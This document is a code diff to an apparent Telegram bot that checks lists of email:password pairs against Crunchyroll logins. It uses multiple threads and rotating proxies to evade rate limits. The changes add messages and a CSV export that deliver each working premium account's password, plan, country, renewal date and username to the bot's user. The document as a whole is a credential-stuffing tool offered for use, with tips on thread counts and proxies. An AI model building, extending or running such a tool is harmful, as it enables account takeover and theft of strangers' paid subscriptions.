@@ -90,7 +90,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├─ 🔐 Multi-threaded account checking
 ├─ 🌐 Proxy rotation support
 ├─ 📊 Live progress bar
-├─ 💾 CSV export
+├─ 💾 CSV export with full details
 ├─ 👑 Admin panel
 └─ 🚀 24/7 uptime
 
@@ -101,7 +101,12 @@ Click the CHECK CRUNCHYROLL button and upload a .txt file
 email:password
 one per line
 
-🎯 **Premium accounts will be detected automatically!**
+🎯 **Premium accounts will show:**
+• Plan (Fan/Mega Fan/Ultimate Fan)
+• Country
+• Renewal date
+• Username
+• Email verification status
 
 Welcome {user.first_name}! 👋
 """
@@ -177,13 +182,21 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 1️⃣ Click CHECK CRUNCHYROLL button
 2️⃣ Upload .txt file (email:password format)
-3️⃣ Wait for checking
-4️⃣ Download CSV with premium accounts
+3️⃣ Watch progress bar
+4️⃣ Download CSV with full account details
+
+**PREMIUM ACCOUNTS SHOW:**
+• Email & Password
+• Plan type (Fan/Mega Fan/Ultimate Fan)
+• Country
+• Renewal date
+• Username
+• Email verification
 
 **TIPS:**
 • Use 3-5 threads for best results
 • Add proxies to avoid rate limits
-• Premium accounts show plan details
+• Premium accounts are saved with all info
 
 **SUPPORT:** Contact your bot admin
 """
@@ -295,7 +308,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text("❌ No valid accounts found! Format: email:password")
         return
     
-    await status_msg.edit_text(f"✅ Loaded {len(accounts)} accounts!\n\n🔄 Starting check...")
+    total_accounts = len(accounts)
+    await status_msg.edit_text(f"✅ Loaded {total_accounts} accounts!\n\n🔄 Starting check...")
     
     proxies = db.get_proxies()
     
@@ -304,25 +318,57 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         threads=config.DEFAULT_THREADS
     )
     
-    progress_msg = await update.message.reply_text("🔄 Checking accounts... 0%")
+    # Progress bar message
+    progress_msg = await update.message.reply_text("🔄 **CHECKING IN PROGRESS**\n\n" + create_progress_bar(0, total_accounts), parse_mode="Markdown")
     hits = []
     
     async def update_progress(current, total, result):
         if result['success']:
             hits.append(result)
-        if current % 5 == 0 or current == total:
-            percent = (current / total) * 100
-            try:
-                await progress_msg.edit_text(
-                    f"🔄 **CHECKING PROGRESS**\n"
-                    f"├─ Processed: {current}/{total}\n"
-                    f"├─ Premium found: {len(hits)}\n"
-                    f"├─ Progress: {percent:.1f}%\n"
-                    f"└─ Speed: {config.DEFAULT_THREADS} threads",
-                    parse_mode="Markdown"
-                )
-            except:
-                pass
+            
+            # Send hit immediately to user with full details
+            hit_text = f"""
+🎯 **PREMIUM ACCOUNT FOUND!**
+
+📧 **Email:** `{result['email']}`
+🔑 **Password:** `{result['password']}`
+💎 **Plan:** {result['plan']}
+🌍 **Country:** {result['country']}
+📅 **Renewal:** {result['renewal'] if result['renewal'] else 'N/A'}
+👤 **Username:** {result['username'] if result['username'] else 'N/A'}
+✅ **Email Verified:** {result['verified']}
+📆 **Member Since:** {result['created'] if result['created'] else 'N/A'}
+
+`{result['email']}:{result['password']}`
+"""
+            await update.message.reply_text(hit_text, parse_mode="Markdown")
+        
+        # Update progress bar every account
+        percent = (current / total) * 100
+        progress_bar = create_progress_bar(current, total)
+        
+        try:
+            await progress_msg.edit_text(
+                f"🔄 **CHECKING IN PROGRESS**\n\n"
+                f"{progress_bar}\n\n"
+                f"📊 **Stats:**\n"
+                f"├─ Processed: {current}/{total}\n"
+                f"├─ Premium Found: {len(hits)}\n"
+                f"├─ Progress: {percent:.1f}%\n"
+                f"└─ Speed: {config.DEFAULT_THREADS} threads",
+                parse_mode="Markdown"
+            )
+        except:
+            pass
+    
+    def create_progress_bar(current, total, length=20):
+        """Create a text-based progress bar"""
+        if total == 0:
+            return "█" * length + " 0%"
+        percent = current / total
+        filled = int(length * percent)
+        bar = "█" * filled + "░" * (length - filled)
+        return f"`{bar}` {percent*100:.1f}%"
     
     checker.set_progress_callback(lambda c, t, r: asyncio.create_task(update_progress(c, t, r)))
     
@@ -337,39 +383,50 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
         csv_buffer = io.StringIO()
         writer = csv.writer(csv_buffer)
-        writer.writerow(['Email', 'Password', 'Plan', 'Country', 'Renewal Date'])
+        writer.writerow(['Email', 'Password', 'Plan', 'Country', 'Renewal Date', 'Username', 'Email Verified', 'Member Since'])
         for hit in hits:
-            writer.writerow([hit['email'], hit['password'], hit['plan'], hit['country'], hit['renewal']])
+            writer.writerow([
+                hit['email'], 
+                hit['password'], 
+                hit['plan'], 
+                hit['country'], 
+                hit['renewal'],
+                hit.get('username', 'N/A'),
+                hit.get('verified', False),
+                hit.get('created', 'N/A')
+            ])
         csv_buffer.seek(0)
         
+        # Final summary with all hits
         result_text = f"""
 🎯 **CHECK COMPLETE!**
 
-📊 **SUMMARY:**
+📊 **FINAL SUMMARY:**
 ├─ Total checked: {len(accounts)}
 ├─ ✅ Premium accounts: {len(hits)}
-└─ ❌ Free/Invalid: {len(accounts) - len(hits)}
+├─ ❌ Free/Invalid: {len(accounts) - len(hits)}
+└─ 📈 Hit rate: {(len(hits)/len(accounts)*100):.1f}%
 
-🏆 **PREMIUM ACCOUNTS FOUND:**
+🏆 **PREMIUM ACCOUNTS ({len(hits)}):**
 """
-        for i, hit in enumerate(hits[:10], 1):
+        for i, hit in enumerate(hits[:15], 1):
             result_text += f"\n{i}. `{hit['email']}` | {hit['plan']} | {hit['country']}"
-        if len(hits) > 10:
-            result_text += f"\n\n... and {len(hits) - 10} more"
+        if len(hits) > 15:
+            result_text += f"\n\n... and {len(hits) - 15} more (see CSV file)"
         
         await progress_msg.delete()
         await update.message.reply_text(result_text, parse_mode="Markdown")
         await update.message.reply_document(
             document=io.BytesIO(csv_buffer.getvalue().encode('utf-8')),
-            filename=f"crunchyroll_hits_{timestamp}.csv",
-            caption=f"✅ {len(hits)} premium accounts found!"
+            filename=f"crunchyroll_premium_hits_{timestamp}.csv",
+            caption=f"✅ {len(hits)} premium accounts with full details!"
         )
     else:
         await progress_msg.edit_text(
             f"❌ **NO PREMIUM ACCOUNTS FOUND!**\n\n"
             f"📊 Total checked: {len(accounts)}\n"
             f"💀 Premium: 0\n\n"
-            f"Tips:\n"
+            f"💡 **Tips:**\n"
             f"• Make sure accounts are premium\n"
             f"• Add proxies for better results\n"
             f"• Try with 3-5 threads",
